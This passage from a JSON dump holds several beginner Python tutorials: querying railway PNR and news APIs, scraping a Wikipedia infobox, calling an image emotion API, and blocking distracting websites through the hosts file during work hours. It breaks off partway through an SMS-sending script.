\"position\"\u00a0\u00a0\u00a0\u00a0# key in variable position\u00a0\u00a0\u00a0\u00a0position = result[\"position\"]\u00a0\u00a0\u00a0\u00a0\u00a0# print details\u00a0\u00a0\u00a0\u00a0print(\" train name : \" + str(train_name)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n source station : \" + str(source_station)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n destination station : \"+ str(destination_station)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n current status : \" + str(position) )\u00a0\u00a0\u00a0\u00a0\u00a0else :\u00a0\u00a0\u00a0\u00a0print(\"Record not Found\")Output:\u00a0\u00a0 train name : NEWDELHI JAN SHATABDI EXP\n source station : DEHRADUN\n destination station : NEW DELHI\n current status : Train has reached Destination and late by 15 minutes.\u00a0\u00a0\u00a0Live PNR status :\u00a0Python3# Python program to find PNR# status using RAILWAY API\u00a0# import required modulesimport requests, json\u00a0# Enter API key hereapi_key = \"Your_API_key\"\u00a0# base_url variable to store urlbase_url = \"https://api.railwayapi.com/v2/pnr-status/pnr/\"\u00a0# Enter valid pnr_numberpnr_number = \"6515483790\"\u00a0# Stores complete url addresscomplete_url = base_url + pnr_number + \"/apikey/\" + api_key + \"/\"\u00a0# get method of requests module# return response objectresponse_ob = requests.get(complete_url)\u00a0# json method of response object convert# json format data into python format dataresult = response_ob.json()\u00a0# now result contains list# of nested dictionariesif result[\"response_code\"] == 200:\u00a0\u00a0\u00a0\u00a0\u00a0# train name is extracting\u00a0\u00a0\u00a0\u00a0# from the result variable data\u00a0\u00a0\u00a0\u00a0train_name = result[\"train\"][\"name\"]\u00a0\u00a0\u00a0\u00a0\u00a0# train number is extracting from\u00a0\u00a0\u00a0\u00a0# the result variable data\u00a0\u00a0\u00a0\u00a0train_number = result[\"train\"][\"number\"]\u00a0\u00a0\u00a0\u00a0\u00a0# from station name is extracting\u00a0\u00a0\u00a0\u00a0# from the result variable data\u00a0\u00a0\u00a0\u00a0from_station = result[\"from_station\"][\"name\"]\u00a0\u00a0\u00a0\u00a0\u00a0# to_station name is extracting from\u00a0\u00a0\u00a0\u00a0# the result variable data\u00a0\u00a0\u00a0\u00a0to_station = result[\"to_station\"][\"name\"]\u00a0\u00a0\u00a0\u00a0\u00a0# boarding point station name is\u00a0\u00a0\u00a0\u00a0# extracting from the result variable data\u00a0\u00a0\u00a0\u00a0boarding_point = result[\"boarding_point\"][\"name\"]\u00a0\u00a0\u00a0\u00a0\u00a0# reservation upto station name is\u00a0\u00a0\u00a0\u00a0# extracting from the result variable data\u00a0\u00a0\u00a0\u00a0reservation_upto = result[\"reservation_upto\"][\"name\"]\u00a0\u00a0\u00a0\u00a0\u00a0# store the value or data of \"pnr\"\u00a0\u00a0\u00a0\u00a0# key in pnr_num variable\u00a0\u00a0\u00a0\u00a0pnr_num = result[\"pnr\"]\u00a0\u00a0\u00a0\u00a0\u00a0# store the value or data of \"doj\" key\u00a0\u00a0\u00a0\u00a0# in variable date_of_journey variable\u00a0\u00a0\u00a0\u00a0date_of_journey = result[\"doj\"]\u00a0\u00a0\u00a0\u00a0\u00a0# store the value or data of\u00a0\u00a0\u00a0\u00a0# \"total_passengers\" key in variable\u00a0\u00a0\u00a0\u00a0total_passengers = result[\"total_passengers\"]\u00a0\u00a0\u00a0\u00a0\u00a0# store the value or data of \"passengers\"\u00a0\u00a0\u00a0\u00a0# key in variable passengers_list\u00a0\u00a0\u00a0\u00a0passengers_list = result[\"passengers\"]\u00a0\u00a0\u00a0\u00a0\u00a0# store the value or data of\u00a0\u00a0\u00a0\u00a0# \"chart_prepared\" key in variable\u00a0\u00a0\u00a0\u00a0chart_prepared = result[\"chart_prepared\"]\u00a0\u00a0\u00a0\u00a0\u00a0# print following values\u00a0\u00a0\u00a0\u00a0print(\" train name : \" + str(train_name)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n train number : \" + str(train_number)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n from station : \" + str(from_station)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n to station : \" + str(to_station)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n boarding point : \" + str(boarding_point)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n reservation upto : \" + str(reservation_upto)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n pnr number : \" + str(pnr_num)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n date of journey : \" + str(date_of_journey)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n total no. of passengers: \" + str(total_passengers)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n chart prepared : \" + str(chart_prepared))\u00a0\u00a0\u00a0\u00a0\u00a0# looping through passenger list\u00a0\u00a0\u00a0\u00a0for passenger in passengers_list:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# store the value or data\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# of \"no\" key in variable\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0passenger_num = passenger[\"no\"]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# store the value or data of\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# \"current_status\" key in variable\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0current_status = passenger[\"current_status\"]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# store the value or data of\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# \"booking_status\" key in variable\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0booking_status = passenger[\"booking_status\"]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# print following values\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\" passenger number : \" + str(passenger_num)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n current status : \" + str(current_status)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n booking_status : \" + str(booking_status))\u00a0else:\u00a0\u00a0\u00a0\u00a0print(\"Record Not Found\")Output :\u00a0\u00a0 train name : DOON EXPRESS\n train number : 13009\n from station : LUCKNOW\n to station : DEHRADUN\n boarding point : LUCKNOW\n reservation upto : DEHRADUN\n pnr number : 6515483790\n date of journey : 01-07-2018\n total no. of passengers: 1\n chart prepared : False\n passenger number : 1\n current status : RLWL/-/16/GN\n booking_status : RLWL/-/23/GN\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "e3c8400023f2c48b1e66e76f37f35338",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "News API is a simple JSON-based REST API for searching and retrieving news articles from all over the web. Using this, one can fetch the top stories running on a news website or can search top news on a specific topic (or keyword).News can be retrieved based on some criteria. Say the topic (keyword) to be searched is \u2018Geeksforgeeks\u2019 or might be concerned to a specific channel. All can be done, but the API key is needed to get started.\u00a0Steps :\n\n1. Visit https://newsapi.org/ to get your own API key.\n\n2. Install requests package.Below is the implementation of the above idea :\u00a0Python3# importing requests packageimport requests\u00a0\u00a0\u00a0\u00a0\u00a0def NewsFromBBC():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# BBC news api\u00a0\u00a0\u00a0\u00a0# following query parameters are used\u00a0\u00a0\u00a0\u00a0# source, sortBy and apiKey\u00a0\u00a0\u00a0\u00a0query_params = {\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"source\": \"bbc-news\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"sortBy\": \"top\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"apiKey\": \"4dbc17e007ab436fb66416009dfb59a8\"\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0main_url = \" https://newsapi.org/v1/articles\"\u00a0\u00a0\u00a0\u00a0\u00a0# fetching data in json format\u00a0\u00a0\u00a0\u00a0res = requests.get(main_url, params=query_params)\u00a0\u00a0\u00a0\u00a0open_bbc_page = res.json()\u00a0\u00a0\u00a0\u00a0\u00a0# getting all articles in a string article\u00a0\u00a0\u00a0\u00a0article = open_bbc_page[\"articles\"]\u00a0\u00a0\u00a0\u00a0\u00a0# empty list which will\u00a0\u00a0\u00a0\u00a0# contain all trending news\u00a0\u00a0\u00a0\u00a0results = []\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for ar in article:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0results.append(ar[\"title\"])\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for i in range(len(results)):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# printing all trending news\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(i + 1, results[i])\u00a0\u00a0\u00a0\u00a0\u00a0#to read the news out loud for us\u00a0\u00a0\u00a0\u00a0from win32com.client import Dispatch\u00a0\u00a0\u00a0\u00a0speak = Dispatch(\"SAPI.Spvoice\")\u00a0\u00a0\u00a0\u00a0speak.Speak(results)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Driver Codeif __name__ == '__main__':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# function call\u00a0\u00a0\u00a0\u00a0NewsFromBBC()Output :\u00a01 Italy to lift coronavirus travel restrictions\n2 White House 'Operation Warp Speed' to look for Covid jab\n3 Two Americas in the nation's capital\n4 Kobe Bryant helicopter crash post-mortem released\n5 Little things people are doing while socially distanced\n6 The last 'normal' photo on your phone\n7 'They came to kill the mothers'\n8 EU-UK Brexit trade talks in trouble\n9 Trial starts to see if dogs can 'sniff out' virus\n10 Beatles photographer Astrid Kirchherr dies aged 81Note: Output may change based on the top articles at the time.Approach 2:This approach will work as a cherry on a cake because it will display the news according to the category entered by the user so as work as a filter for those who want to know the news in a particular category/section.First of all install newsapi and pycountry in your system if it\u2019s not there the install using the command below:~ pip install newsapi-python\n~ pip install pycountryPython3from newsapi import NewsApiClientimport pycountry\u00a0# you have to get your api key from newapi.com and then paste it belownewsapi = NewsApiClient(api_key='Your API Key')\u00a0# now we will take name of country from user as inputinput_country = input(\"Country: \")input_countries = [f'{input_country.strip()}']countries = {}\u00a0# iterate over all the countries in# the world using pycountry modulefor country in pycountry.countries:\u00a0\u00a0\u00a0\u00a0\u00a0# and store the unique code of each country\u00a0\u00a0\u00a0\u00a0# in the dictionary along with it's full name\u00a0\u00a0\u00a0\u00a0countries[country.name] = country.alpha_2\u00a0# now we will check that the entered country name is# valid or invalid using the unique codecodes = [countries.get(country.title(), 'Unknown code')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for country in input_countries]\u00a0# now we have to display all the categories from which user will# decide and enter the name of that categoryoption = input(\"Which category are you interested in?\\n1.Business\\n2.Entertainment\\n3.General\\n4.Health\\n5.Science\\n6.Technology\\n\\nEnter here: \")\u00a0# now we will fetch the new according to the choice of the usertop_headlines = newsapi.get_top_headlines(\u00a0\u00a0\u00a0\u00a0\u00a0# getting top headlines from all the news channels\u00a0\u00a0\u00a0\u00a0category=f'{option.lower()}', language='en', country=f'{codes[0].lower()}')\u00a0\u00a0\u00a0# fetch the top news inder that category\u00a0\u00a0Headlines = top_headlines['articles']\u00a0\u00a0\u00a0\u00a0# now we will display the that news with a good readability for user\u00a0\u00a0\u00a0if Headlines:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for articles in Headlines:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0b = articles['title'][::-1].index(\"-\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if \"news\" in (articles['title'][-b+1:]).lower():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0f\"{articles['title'][-b+1:]}: {articles['title'][:-b-2]}.\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0f\"{articles['title'][-b+1:]} News: {articles['title'][:-b-2]}.\")\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0f\"Sorry no articles found for {input_country}, Something Wrong!!!\")\u00a0\u00a0\u00a0\u00a0option = input(\"Do you want to search again[Yes/No]?\")\u00a0\u00a0\u00a0\u00a0if option.lower() == 'yes':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0continue\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0exit()Input:Country: India\nWhich category are you interested in?\n1.Business\n2.Entertainment\n3.General\n4.Health\n5.Science\n6.Technology\n\nEnter here: TechnologyOutput:Gizbot News: Garena Free Fire Redeem Codes For August 16; Get Master of Minds Weapon Loot Crate.\nNews18: Google Pixel 5a Will Have Biggest Battery On Any Pixel Phone Ever, Launch This Month.\nHindustan Times News: PUBG Mobile: Here\u2019s how to get the Unhinged Mortician set on PUBG Mobile, check details of RPM2 Royale Pass.\nTimes of India News: New iPhones, Watch, AirPods and more: What Apple may launch in September.\nGSMArena.com News: Top 10 trending phones of week 32 - GSMArena.com news.\nHindustan Times News: Study finds if 'people persons' are 'machine persons' when they interact online.\nTimes of India News: 2021 vs 2020: August gasps for one \u2018good\u2019 air day in Gurugram this year.\nScienceAlert News: A Simple Crystal Could Finally Give Us Large-Scale Quantum Computing, Scientists Say.\nEngadget News: The Switch is the first console to sweep Japan's game sales chart in 33 years.\nGSMArena.com News: Weekly poll: Samsung Galaxy Z Fold3, the new S Pen and the Galaxy Z Flip3 - GSMArena.com news.\nMarket Research Telecast News: How to import your WhatsApp chats to WhatsApp Plus 17.00 Heymods.\nNotebookcheck.net News: Realme will finally debut its first-gen laptop later in August 2021.\nNewsBytes: Redmi 10 officially teased; color options revealed.\nThe Siasat Daily News: Xiaomi removes anti-lost mode from Mi Mix 4.\nZee News: Good news for Motorola Razr owners! Smartphone is finally getting Android 11 update.\nEssentiallySports News: Animal Crossing: New Horizons- Predictions for the Next Big Update.\nRepublic World News: Motorola Edge 20 price in India Leaked: Price to range between Rs 21,499 to Rs 29,999.\nEurogamer.net News: Assassinations have been temporarily removed from Halo Infinite because \"people just turn them off\".\nEssentiallySports News: Call of Duty: Warzone- If You Can Win a Game Despite the Hackers, You Can See a Vanguard Teaser.\nTechradar News: Facebook Messenger voice and video calls are getting end-to-end encryption.\nDo you want to search again[Yes/No]? NoMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "339fea2f72764e69d67294701dad05cd",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "An infobox is a template used to collect and present a subset of information about its subject. It can be described as a structured document containing a set of attribute-value pairs, and in Wikipedia, it represents a summary of information about the subject of an article.So a Wikipedia infobox is a fixed-format table usually added to the top right-hand corner of articles to represent a summary article of that wiki page and sometimes to improve navigation to other interrelated articles.\u00a0[To know more about infobox, Click here]Web Scraping is a mechanism that helps to extract large amounts of data from websites whereby the data is extracted and saved to a local file in your computer or to a database in table (spreadsheet) format.\u00a0There are several ways to extract information from the web. Using APIs is one of the best ways to extract data from a website. Almost all large websites like Youtube Facebook, Google, Twitter, StackOverflow provide APIs to access their data in a more structured manner. If you can get what you need through an API, it is almost always preferred the red approach over web scraping.\u00a0Sometimes, there is a need for scraping the content of a Wikipedia page, while we are developing any project or using it somewhere else. In this article, I\u2019ll tell how to extract contents of the Wikipedia\u2019s Infobox.Basically, We can use two Python modules for scraping data:\u00a0Urllib2: It is a Python module that can be used for fetching URLs. urllib2 is a Python module for fetching URLs. It offers a very simple interface, in the form of the urlopen function. This is capable of fetching URLs using a variety of different protocols. For more detail refer to the documentation page.BeautifulSoup: It is an incredible tool for pulling out information from a webpage. You can use it to extract tables, lists, paragraphs and you can also put filters to extract information from web pages. Look at the documentation page of BeautifulSoup\u00a0BeautifulSoup does not fetch the web page for us. We can use urllib2 with the BeautifulSoup library.Now I am going to tell you another easy way for scraping\u00a0Steps for the following:The modules we will be using are:\u00a0\u00a0I have used Python 2.7 here,Make sure these modules are installed on your machine.\u00a0If not then on the console or prompt you can install it using pip\u00a0\u00a0Python# importing modulesimport requestsfrom lxml import etree\u00a0\u00a0# manually storing desired URLurl='https://en.wikipedia.org/wiki/Delhi_Public_School_Society'\u00a0\u00a0# fetching its url through requests module\u00a0\u00a0req = requests.get(url)\u00a0\u00a0\u00a0store = etree.fromstring(req.text)\u00a0\u00a0# this will give Motto portion of above\u00a0# URL's info box of Wikipedia's pageoutput = store.xpath('//table[@class=\"infobox vcard\"]/tr[th/text()=\"Motto\"]/td/i')\u00a0\u00a0\u00a0# printing the text portionprint output[0].text\u00a0\u00a0\u00a0\u00a0# Run this program on your installed Python or\u00a0# on your local system using cmd or any IDE.See this link, it will display the \u2018Motto section\u2019 of this Wikipedia page info box.(as shown in this screenshot)\u00a0\u00a0Write your code first of allNow finally after running the program you get,You can also modify the URL.XPath to get different sections of the infobox.\u00a0If you want to learn more about web scraping, go to these links,\u00a01) Web Scraping 1\u00a02) Web Scraping 2\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "b8f1dd7ebc63977386ad519f70cb08e1",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "The emotions of images like happy, sad, neutral, surprise, etc. can be extracted using Microsoft emotion API for any development purpose.It is very simple to use and can be called via API through terminal or any of languages like Python or PHP. Microsoft provides free subscription of 30 days for making total of 30,000 requests.The details of the end points and parameters can be found in the documentation.# Python script to analyze# emotion of imageimport http.client, urllib.requestimport urllib.parse, urllib.errorimport base64, sysimport simplejson as json\u00a0\u00a0# replace with subscription_key# you obtained after registrationsubscription_key = '12f29133caf4406493e81b6a31c47c1a'\u00a0\u00a0headers = {\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Request headers. Replace\u00a0\u00a0\u00a0\u00a0# the placeholder key\u00a0\u00a0\u00a0\u00a0# below with your\u00a0\u00a0\u00a0\u00a0# subscription key.\u00a0\u00a0\u00a0\u00a0'Content-Type': 'application/json',\u00a0\u00a0\u00a0\u00a0'Ocp-Apim-Subscription-Key': subscription_key,}\u00a0\u00a0params = urllib.parse.urlencode({})\u00a0\u00a0# Replace the URL# below with the# URL of the image# you want to analyze.url1 = 'IMAGE URL TO BE ADDED HERE'body = { 'url': url1 }newbody =str(body)\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0# NOTE: You must use the same region in your REST call as you used to obtain your subscription keys.\u00a0\u00a0\u00a0\u00a0# For example, if you obtained your subscription keys from westcentralus, replace \"westus\" in the\u00a0\u00a0\u00a0\u00a0# URL below with \"westcentralus\".\u00a0\u00a0\u00a0\u00a0conn = http.client.HTTPSConnection('westus.api.cognitive.microsoft.com')\u00a0\u00a0\u00a0\u00a0conn.request(\"POST\", \"/emotion/v1.0/recognize?%s\" % params, newbody, headers)\u00a0\u00a0\u00a0\u00a0response = conn.getresponse()\u00a0\u00a0\u00a0\u00a0data = response.read()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0parsed = json.loads(data)\u00a0\u00a0\u00a0\u00a0print (\"Response:\")\u00a0\u00a0\u00a0\u00a0print (json.dumps(parsed, sort_keys=True, indent=2))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# the emotion of image\u00a0\u00a0\u00a0\u00a0# will the max value of\u00a0\u00a0\u00a0\u00a0# any emotion obtained\u00a0\u00a0\u00a0\u00a0# from the different\u00a0\u00a0\u00a0\u00a0# scores of each emotion\u00a0\u00a0\u00a0\u00a0val = parsed[0][\"scores\"]\u00a0\u00a0\u00a0\u00a0res = max(val, key = val.get)\u00a0\u00a0\u00a0\u00a0print (\"\\nEmotion :: \",res)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0conn.close()except Exception as e:\u00a0\u00a0\u00a0\u00a0print(e.args)The sample project using this api is available on SnapLookMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "80fe7fb9ee1ee1d511a0b3a74efc7a24",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "This is real world program which blocks certain distracting website like Facebook, Youtube etc during your work hours.About the program : What we are going to in this program is that we will pass the link of websites which you think is distracting and the time that you are working on your computer and program will block those website.Program Architecture:Every system have host file whether it is Mac, Windows or Linux.Host file in Mac and Linux :/etc/hostsHost file in Windows:C:\\Windows\\System32\\drivers\\etcWorking of host file: Host is an operating system file which maps hostnames to IP addresses. In this program we will be mapping hostnames of websites to our localhost address. Using python file handling manipulation we will write the hostname in hosts.txt and remove the lines after your working hours.Host file in Mac:# Run this script as root\u00a0\u00a0import timefrom datetime import datetime as dt\u00a0\u00a0# change hosts path according to your OShosts_path = \"/etc/hosts\"# localhost's IPredirect = \"127.0.0.1\"\u00a0\u00a0# websites That you want to blockwebsite_list =\u00a0[\"www.facebook.com\",\"facebook.com\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"dub119.mail.live.com\",\"www.dub119.mail.live.com\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"www.gmail.com\",\"gmail.com\"]\u00a0\u00a0while True:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# time of your work\u00a0\u00a0\u00a0\u00a0if dt(dt.now().year, dt.now().month, dt.now().day,8)\u00a0\u00a0\u00a0\u00a0\u00a0< dt.now() < dt(dt.now().year, dt.now().month, dt.now().day,16):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Working hours...\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0with open(hosts_path, 'r+') as file:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0content = file.read()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for website in website_list:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if website in content:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0pass\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# mapping hostnames to your localhost IP address\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0file.write(redirect + \" \" + website + \"\\n\")\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0with open(hosts_path, 'r+') as file:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0content=file.readlines()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0file.seek(0)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for line in content:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if not any(website in line for website in website_list):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0file.write(line)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# removing hostnmes from host file\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0file.truncate()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Fun hours...\")\u00a0\u00a0\u00a0\u00a0time.sleep(5)Special note for Windows users : Windows user need to create a duplicate of OS\u2019s host file. Now provide the path of the duplicate file in hosts_path mentioned in the script.Scheduling above script in Mac : For scheduling above script in Mac you have to open crontab in your terminal as a root.Write following command in terminal:sudo crontab -eYour terminal should look like this:Now press \u201ci\u201d to go into insert/editing mode and write @reboot python_script_path .Save the tab by pressing first esc to quit write mode and fall back to command mode and now write \u201c:wq\u201d and finally press enter to validate.Restart your system and see the magic.Scheduling in Windows: Scheduling of above script is little bit trick but I will guide you step by step-First of all change the extension of your script from \u201c.py\u201d to \u201c.pyw\u201d.Now open task scheduler. Task scheduler should look like this:You may see website blocker already scheduled because I have already scheduled in my computer for my testing purpose. Follow further instruction of scheduling carefully in order to schedule website blocker in your computer.Click on \u201ccreate task\u201d. Fill the name of your choice and flag \u201cRun with highest privilege\u201d.Now go to triggers, select \u201cAt startup\u201d for begin the task.Go to Action bar and create a new action and give path of your script.Go to conditions bar and unflag the power section.Press ok and you can see the script scheduled.Finally restart your computer and see the magic.Note: You can also check instantly by clicking run button.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "55de0bb09c82da2d0eb3b3162de6ef45",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "If you are running any python script and want to send regular updates from your script to your mobile phone through SMS, you can use SinchSMS API to send SMS.Approach :\u00a0Create an app on Sinch and get the key and secret of the app and use these credentials in the following script to send SMS to your mobile.Limitation of Sinch :\u00a0If you don\u2019t have any credits(you have to pay for credits), you can only send SMS to the registered mobile numbers on Sinch.\u00a0You can use way2sms to send SMS to any number(I will be discussing how to use way2sms in another article), but without purchased credits, on way2sms also, you can\u2019t send more than 100 SMS per day.\u00a0Python# python script for sending message update\u00a0import timefrom time import sleepfrom sinchsms import SinchSMS\u00a0# function for sending SMSdef sendSMS():\u00a0\u00a0\u00a0\u00a0\u00a0# enter all the details\u00a0\u00a0\u00a0\u00a0# get app_key and app_secret by registering\u00a0\u00a0\u00a0\u00a0# a app on sinchSMS\u00a0\u00a0\u00a0\u00a0number = 'your_mobile_number'\u00a0\u00a0\u00a0\u00a0app_key = 'your_app_key'\u00a0\u00a0\u00a0\u00a0app_secret = 